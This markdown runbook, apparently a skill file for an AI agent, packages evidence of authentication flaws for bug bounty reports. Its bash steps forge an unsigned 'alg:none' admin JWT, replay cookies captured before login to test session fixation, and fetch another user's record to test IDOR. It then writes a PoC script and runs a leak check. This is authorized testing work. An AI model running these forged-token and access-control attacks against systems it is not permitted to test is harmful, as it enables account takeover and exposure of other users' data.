# Auth Evidence Collection Runbook

## Purpose
Package all evidence in a standardized format suitable for bug bounty report submission.

## Variables
- `$TARGET_URL` — base URL
- `$OUTDIR` — output directory
- `$EVIDENCE_DIR` — `$OUTDIR/evidence/auth`
- `$AUTH_TYPE` — one of: jwt-attack, password-reset, session-fixation, mfa-bypass, idor

## Step 1 — Initialize Evidence Directory
```bash
EVIDENCE_DIR="$OUTDIR/evidence/auth"
mkdir -p "$EVIDENCE_DIR/request" "$EVIDENCE_DIR/response" "$EVIDENCE_DIR/screenshots" "$EVIDENCE_DIR/tool-versions"
```

## Step 2 — Capture Tool Versions
```bash
curl --version > "$EVIDENCE_DIR/tool-versions/curl.txt" 2>&1
python3 --version > "$EVIDENCE_DIR/tool-versions/python3.txt" 2>&1
jq --version > "$EVIDENCE_DIR/tool-versions/jq.txt" 2>&1
ffuf --version > "$EVIDENCE_DIR/tool-versions/ffuf.txt" 2>&1
```

## Step 3 — Capture Auth Flow Evidence

### JWT Attack Evidence
```bash
TIMESTAMP=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "$TIMESTAMP" > "$EVIDENCE_DIR/timestamp.txt"

HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-')
TOKEN="${HEADER}.${PAYLOAD}."

curl -sk -v -H "Authorization: Bearer $TOKEN" "$TARGET_URL/api/me" > "$EVIDENCE_DIR/request/01-jwt-none-attack.txt" 2>&1
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET_URL/api/me" -o "$EVIDENCE_DIR/response/01-jwt-none-response.json"

echo "Original JWT: $JWT_TOKEN" > "$EVIDENCE_DIR/request/jwt-original.txt"
echo "Forged JWT: $TOKEN" >> "$EVIDENCE_DIR/request/jwt-forged.txt"
```

### Session Fixation Evidence
```bash
curl -sk -v -c "$EVIDENCE_DIR/request/02-fixation-prelogin-cookies.txt" "$TARGET_URL/login" -o /dev/null 2>&1
curl -sk -v -b "$EVIDENCE_DIR/request/02-fixation-prelogin-cookies.txt" -c "$EVIDENCE_DIR/response/02-fixation-postlogin-cookies.txt" -d "username=$TEST_USER&password=$TEST_PASS" "$TARGET_URL/login" > "$EVIDENCE_DIR/request/02-fixation-login.txt" 2>&1
diff "$EVIDENCE_DIR/request/02-fixation-prelogin-cookies.txt" "$EVIDENCE_DIR/response/02-fixation-postlogin-cookies.txt" > "$EVIDENCE_DIR/response/02-fixation-diff.txt"
curl -sk -b "$EVIDENCE_DIR/request/02-fixation-prelogin-cookies.txt" "$TARGET_URL/dashboard" -o "$EVIDENCE_DIR/response/02-fixated-access.html"
```

### IDOR Evidence
```bash
curl -sk -v -b "$COOKIE_JAR" "$TARGET_URL/api/user/1" > "$EVIDENCE_DIR/request/03-idor-legitimate.txt" 2>&1
curl -sk -v -b "$COOKIE_JAR" "$TARGET_URL/api/user/2" > "$EVIDENCE_DIR/request/04-idor-cross-user.txt" 2>&1
curl -sk -b "$COOKIE_JAR" -o "$EVIDENCE_DIR/response/03-idor-user1.json" "$TARGET_URL/api/user/1"
curl -sk -b "$COOKIE_JAR" -o "$EVIDENCE_DIR/response/04-idor-user2.json" "$TARGET_URL/api/user/2"
```

## Step 4 — Create PoC Script
```bash
cat > "$EVIDENCE_DIR/poc.sh" << 'POCEOF'
#!/bin/bash
TARGET_URL="${1:-$TARGET_URL}"
# Reproduce auth vulnerability
echo "PoC for $AUTH_TYPE at $TARGET_URL"
curl -sk -v "$TARGET_URL/api/me" -H "Authorization: Bearer <FORGED_TOKEN>"
POCEOF
chmod +x "$EVIDENCE_DIR/poc.sh"
```

## Step 5 — Evidence Manifest
```bash
cat > "$EVIDENCE_DIR/manifest.md" << MANIFESTEOF
# Auth Vulnerability Evidence Manifest
**Target:** $TARGET_URL
**Auth Type:** $AUTH_TYPE
**Severity:** High-Critical
**Timestamp:** $(date -u +%Y-%m-%dT%H:%M:%SZ)

## Files
| File | Description |
|---|---|
| request/jwt-original.txt | Original JWT token |
| request/jwt-forged.txt | Forged JWT token |
| response/01-jwt-none-response.json | API response with forged token |
| response/02-fixated-access.html | Dashboard accessed with fixated session |
| response/03-idor-user1.json | Your own user data |
| response/04-idor-user2.json | Other user's data (IDOR) |
| poc.sh | Reproducible PoC script |
| tool-versions/* | Tool versions used |
MANIFESTEOF
```

## Step 6 — Validate and Leak Check
```bash
REQUIRED_FILES=( "request/01-jwt-none-attack.txt" "poc.sh" "manifest.md" )
ALL_OK=true
for f in "${REQUIRED_FILES[@]}"; do
  [ -s "$EVIDENCE_DIR/$f" ] && echo "OK: $f" || { echo "MISSING: $f"; ALL_OK=false; }
done
$ALL_OK && echo "EVIDENCE COMPLETE" || echo "EVIDENCE INCOMPLETE"

gitleaks detect --source "$EVIDENCE_DIR" --no-git -v 2>&1 | tee "$EVIDENCE_DIR/leak-check.txt"
```

## Output Directory Structure
```
$OUTDIR/evidence/auth/
├── manifest.md
├── timestamp.txt
├── poc.sh
├── request/
│   ├── jwt-original.txt
│   ├── jwt-forged.txt
│   ├── 01-jwt-none-attack.txt
│   ├── 02-fixation-login.txt
│   ├── 03-idor-legitimate.txt
│   └── 04-idor-cross-user.txt
├── response/
│   ├── 01-jwt-none-response.json
│   ├── 02-fixated-access.html
│   ├── 03-idor-user1.json
│   └── 04-idor-user2.json
└── tool-versions/
    ├── curl.txt
    ├── python3.txt
    ├── jq.txt
    └── ffuf.txt
```

## Next Routing
- Evidence complete -> hand off to `.claude/skills/reporting/SKILL.md`
